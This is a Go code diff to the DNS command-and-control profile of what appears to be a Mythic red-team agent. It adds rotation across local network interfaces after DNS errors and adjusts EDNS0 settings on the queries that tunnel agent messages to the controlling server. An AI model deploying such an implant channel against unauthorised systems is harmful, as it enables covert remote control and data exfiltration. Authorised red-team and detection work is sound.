@@ -67,6 +67,8 @@ type C2DNS struct {
 	ShouldStop            bool
 	stoppedChannel        chan bool
 	interruptSleepChannel chan bool
+	localInterfaces       []net.Interface
+	currentLocalInterface int
 }
 
 // DnsMessageStream tracks the progress of a message in chunk transfer
@@ -141,6 +143,13 @@ func init() {
 	dnsClient.Dialer = &net.Dialer{
 		Timeout: 5 * time.Second,
 	}
+	profile.localInterfaces, err = net.Interfaces()
+	if err != nil {
+		utils.PrintDebug(fmt.Sprintf("error trying to get local interfaces, exiting: %v\n", err))
+		profile.localInterfaces = []net.Interface{}
+	}
+	profile.currentLocalInterface = -1
+	profile.adjustLocalAddress()
 	RegisterAvailableC2Profile(&profile)
 }
 func (c *C2DNS) Sleep() {
@@ -577,6 +586,38 @@ func (c *C2DNS) getDomain() string {
 }
 func (c *C2DNS) increaseErrorCount(domain string) {
 	c.DomainErrors[domain] += 1
+	c.adjustLocalAddress()
+}
+func (c *C2DNS) adjustLocalAddress() {
+	if len(c.localInterfaces) == 0 {
+		dnsClient.Dialer.LocalAddr = nil
+		return
+	}
+	for _ = range c.localInterfaces {
+		c.currentLocalInterface = (c.currentLocalInterface + 1) % len(c.localInterfaces)
+		iface := c.localInterfaces[c.currentLocalInterface]
+		addrs, err := iface.Addrs()
+		if err != nil {
+			utils.PrintDebug(fmt.Sprintf("error getting local addresses: %v\n", err))
+			//dnsClient.Dialer.LocalAddr = nil
+			//return
+			continue
+		}
+		var localAddr *net.UDPAddr
+		for _, addr := range addrs {
+			if ipNet, ok := addr.(*net.IPNet); ok {
+				if ipNet.IP.To4() != nil {
+					localAddr = &net.UDPAddr{IP: ipNet.IP}
+					utils.PrintDebug(fmt.Sprintf("using local addr: %v\n", localAddr))
+					dnsClient.Dialer.LocalAddr = localAddr
+					return
+				}
+			}
+		}
+	}
+	utils.PrintDebug(fmt.Sprintf("no valid ips found at all, using nil local addr\n"))
+	dnsClient.Dialer.LocalAddr = nil
+	return
 }
 func (c *C2DNS) streamDNSPacketToServer(msg string) uint32 {
 	sendingStream := &DnsMessageStream{
@@ -622,7 +663,6 @@ func (c *C2DNS) streamDNSPacketToServer(msg string) uint32 {
 			m := new(dns.Msg)
 			m.RecursionAvailable = true
 			m.RecursionDesired = true
-			m.SetEdns0(4096, true)
 			jsonData, err := proto.Marshal(sendingStream.Messages[sendingStream.StartBytes[i]])
 			if err != nil {
 				utils.PrintDebug(fmt.Sprintf("marshal error: %v\n", err))
@@ -638,6 +678,7 @@ func (c *C2DNS) streamDNSPacketToServer(msg string) uint32 {
 				}
 			}
 			m = m.SetQuestion(dns.Fqdn(finalData+domain), c.getRequestType())
+			m = m.SetEdns0(4096, true)
 			//utils.PrintDebug(fmt.Sprintf("sending to Mythic: chunk: %d, domain: %s\n", sendingStream.StartBytes[i], dns.Fqdn(finalData+domain)))
 			//utils.PrintDebug(fmt.Sprintf("sending to Mythic: Total domain length: %d\n", len(finalData+domain)))
 			//utils.PrintDebug(fmt.Sprintf("%v\n", m))
@@ -792,7 +833,6 @@ func (c *C2DNS) getDNSMessageFromServer(messageID uint32) []byte {
 			m := new(dns.Msg)
 			m.RecursionAvailable = true
 			m.RecursionDesired = true
-			m.SetEdns0(4096, true)
 			jsonData, err := proto.Marshal(request)
 			if err != nil {
 				utils.PrintDebug(fmt.Sprintf("json marshal error: %v\n", err))
@@ -808,6 +848,7 @@ func (c *C2DNS) getDNSMessageFromServer(messageID uint32) []byte {
 				}
 			}
 			m = m.SetQuestion(dns.Fqdn(finalData+domain), c.getRequestType())
+			m = m.SetEdns0(4096, true)
 			//utils.PrintDebug(fmt.Sprintf("get message From Mythic: chunk: %d, domain: %s\n", lastChunk, dns.Fqdn(finalData+domain)))
 			//utils.PrintDebug(fmt.Sprintf("Total domain length: %d\n", len(finalData+domain)))
 			//utils.PrintDebug(fmt.Sprintf("%v\n", m))
